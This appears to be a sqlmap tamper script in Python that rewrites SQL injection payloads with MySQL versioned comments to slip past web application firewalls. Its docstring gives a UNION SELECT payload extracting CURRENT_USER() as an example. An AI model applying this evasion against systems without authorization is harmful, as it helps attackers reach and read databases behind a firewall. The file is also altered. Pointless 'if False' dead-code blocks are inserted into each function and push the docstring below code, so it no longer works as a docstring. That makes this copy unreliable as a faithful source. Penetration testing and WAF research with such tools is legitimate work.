"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import os
import re
from lib.core.common import singleTimeWarnMessage
from lib.core.data import kb
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS
__priority__ = PRIORITY.HIGHER

def dependencies():
    if False:
        i = 10
        return i + 15
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s < 5.1" % (os.path.basename(__file__).split('.')[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    if False:
        for i in range(10):
            print('nop')
    '\n    Adds (MySQL) versioned comment before each keyword\n\n    Requirement:\n        * MySQL < 5.1\n\n    Tested against:\n        * MySQL 4.0.18, 5.0.22\n\n    Notes:\n        * Useful to bypass several web application firewalls when the\n          back-end database management system is MySQL\n        * Used during the ModSecurity SQL injection challenge,\n          http://modsecurity.org/demo/challenge.html\n\n    >>> tamper("value\' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND \'QDWa\'=\'QDWa")\n    "value\'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND \'QDWa\'=\'QDWa"\n    '

    def process(match):
        if False:
            print('Hello World!')
        word = match.group('word')
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, '/*!0%s' % word)
        else:
            return match.group()
    retVal = payload
    if payload:
        retVal = re.sub('(?<=\\W)(?P<word>[A-Za-z_]+)(?=\\W|\\Z)', process, retVal)
        retVal = retVal.replace(' /*!0', '/*!0')
    return retVal